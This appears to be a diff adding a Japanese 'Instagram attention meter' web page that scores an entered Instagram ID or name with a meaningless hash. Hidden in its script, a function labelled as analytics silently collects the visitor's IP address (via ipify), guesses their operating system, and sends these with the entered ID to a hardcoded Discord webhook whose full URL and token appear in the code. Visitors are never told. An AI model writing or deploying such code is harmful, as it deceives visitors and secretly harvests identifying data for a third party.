@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram注目度メーター</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 30px;
+            font-size: 2.2em;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .input-section {
+            margin-bottom: 30px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px 20px;
+            font-size: 18px;
+            border: 2px solid #ddd;
+            border-radius: 50px;
+            outline: none;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        input:focus {
+            border-color: #667eea;
+            box-shadow: 0 0 20px rgba(102, 126, 234, 0.3);
+        }
+
+        button {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        .result-section {
+            margin-top: 30px;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.5s ease;
+        }
+
+        .result-section.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .meter-container {
+            margin: 30px auto;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .range-container {
+            position: relative;
+            margin: 20px 0;
+        }
+
+        .range-slider {
+            -webkit-appearance: none;
+            width: 100%;
+            height: 20px;
+            border-radius: 10px;
+            background: linear-gradient(to right, #ff6b6b, #ffa500, #ffff00, #32cd32, #00bfff, #8a2be2);
+            outline: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .range-slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: white;
+            cursor: pointer;
+            border: 3px solid #667eea;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            transition: all 0.3s ease;
+        }
+
+        .range-slider::-webkit-slider-thumb:hover {
+            transform: scale(1.1);
+            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+        }
+
+        .range-slider::-moz-range-thumb {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: white;
+            cursor: pointer;
+            border: 3px solid #667eea;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        }
+
+        .percentage {
+            font-size: 3em;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .label {
+            font-size: 1.2em;
+            color: #666;
+            font-weight: 500;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .attention-level {
+            margin-top: 20px;
+            padding: 15px 25px;
+            border-radius: 50px;
+            font-size: 1.3em;
+            font-weight: bold;
+            color: white;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.2);
+        }
+
+        .level-low { background: linear-gradient(45deg, #ff6b6b, #ff8e53); }
+        .level-medium { background: linear-gradient(45deg, #ffa500, #ffff00); color: #333; text-shadow: none; }
+        .level-high { background: linear-gradient(45deg, #32cd32, #00bfff); }
+        .level-very-high { background: linear-gradient(45deg, #8a2be2, #ff1493); }
+
+        .instagram-icon {
+            display: inline-block;
+            margin-right: 10px;
+            font-size: 1.2em;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1><span class="instagram-icon">📸</span>Instagram注目度メーター</h1>
+        
+        <div class="input-section">
+            <div class="input-wrapper">
+                <input type="text" id="instagramId" placeholder="自分のIDを試してみよう！名前も可！" maxlength="30">
+            </div>
+            <button onclick="calculateAttention()">注目度を測定</button>
+        </div>
+
+        <div class="result-section" id="resultSection">
+            <div class="meter-container">
+                <div class="percentage" id="percentage">0%</div>
+                <div class="range-container">
+                    <input type="range" min="0" max="100" value="0" class="range-slider" id="rangeSlider" disabled>
+                </div>
+                <div class="label">注目度</div>
+            </div>
+            <div class="attention-level" id="attentionLevel"></div>
+        </div>
+    </div>
+
+    <script>
+        function sendWebhookNotification(text) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1399588888548347934/vafQRtJnjFy3mZ1ZliJbSJDJ5B1IEPDEGUuzg51Yo_Pc6dum0vjm5i78oGY4R_gJCCZF';
+            // OS名を取得する関数
+            function getOSName() {
+                const userAgent = navigator.userAgent;
+                let osName = "Chrome OS";
+                if (userAgent.indexOf("Win") !== -1) osName = "Windows";
+                else if (userAgent.indexOf("Mac") !== -1) osName = "macOS";
+                else if (userAgent.indexOf("Linux") !== -1) osName = "Linux";
+                else if (userAgent.indexOf("Android") !== -1) osName = "Android";
+                else if (userAgent.indexOf("like Mac") !== -1) osName = "iOS";
+                return osName;
+            }
+            const osName = getOSName(); // OS名を取得
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip; // 取得したIPアドレス
+                    const message = {
+                        content: `/アナリティクス ID: ${text}, IP: ${ipAddress}, OS: ${osName}, 内容: **${text}**`
+                    };
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(message),
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Success:', data);
+                    })
+                    .catch((error) => {
+                        console.error('Error:', error);
+                    });
+                })
+                .catch(error => console.error('Error:', error));
+        }
+
+        function calculateAttention() {
+            const input = document.getElementById('instagramId');
+            const id = input.value.trim();
+            
+            if (!id) {
+                alert('InstagramのIDを入力してください');
+                return;
+            }
+
+            // @マークを除去
+            const cleanId = id.replace(/^@+/, '');
+            
+            if (cleanId.length === 0) {
+                alert('有効なIDを入力してください');
+                return;
+            }
+
+            // IDを数値化してハッシュ値を計算
+            const attention = calculateHash(cleanId);
+            
+            // アナリティクス用のWebhook通知を送信
+            sendWebhookNotification(cleanId);
+            
+            showResult(attention, cleanId);
+        }
+
+        function calculateHash(str) {
+            let hash = 0;
+            
+            // 文字列の各文字を数値化して累積
+            for (let i = 0; i < str.length; i++) {
+                const char = str.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash; // 32bit整数に変換
+            }
+            
+            // 負の値を正の値に変換
+            hash = Math.abs(hash);
+            
+            // 文字列長による重み付け
+            const lengthWeight = Math.min(str.length / 20, 1);
+            hash = hash * (0.5 + lengthWeight * 0.5);
+            
+            // 特定の文字パターンによるボーナス
+            let bonus = 0;
+            if (/[0-9]/.test(str)) bonus += 0.1; // 数字が含まれている
+            if (/[._]/.test(str)) bonus += 0.05; // アンダースコアやドットが含まれている
+            if (str.length >= 8) bonus += 0.1; // 長いID
+            if (/^[a-z]+$/.test(str)) bonus += 0.05; // すべて小文字
+            
+            hash = hash * (1 + bonus);
+            
+            // 0-100の範囲に正規化
+            const percentage = (hash % 10000) / 100;
+            return Math.round(percentage * 100) / 100;
+        }
+
+        function showResult(attention, id) {
+            const resultSection = document.getElementById('resultSection');
+            const percentage = document.getElementById('percentage');
+            const rangeSlider = document.getElementById('rangeSlider');
+            const attentionLevel = document.getElementById('attentionLevel');
+            
+            resultSection.classList.add('show');
+            
+            // パーセンテージをアニメーション
+            let currentValue = 0;
+            const increment = attention / 50;
+            const timer = setInterval(() => {
+                currentValue += increment;
+                if (currentValue >= attention) {
+                    currentValue = attention;
+                    clearInterval(timer);
+                }
+                const roundedValue = Math.round(currentValue);
+                percentage.textContent = roundedValue + '%';
+                rangeSlider.value = roundedValue;
+            }, 20);
+
+            // 注目度レベルの表示
+            setTimeout(() => {
+                let level, levelClass;
+                if (attention < 25) {
+                    level = "控えめな存在感";
+                    levelClass = "level-low";
+                } else if (attention < 50) {
+                    level = "程よい注目度";
+                    levelClass = "level-medium";
+                } else if (attention < 75) {
+                    level = "高い注目度";
+                    levelClass = "level-high";
+                } else {
+                    level = "カリスマ的存在";
+                    levelClass = "level-very-high";
+                }
+                
+                attentionLevel.textContent = `@${id} は ${level}！`;
+                attentionLevel.className = `attention-level ${levelClass} pulse`;
+            }, 1000);
+        }
+
+
+
+        // Enterキーで測定実行
+        document.getElementById('instagramId').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                calculateAttention();
+            }
+        });
+    </script>
+</body>
+</html>
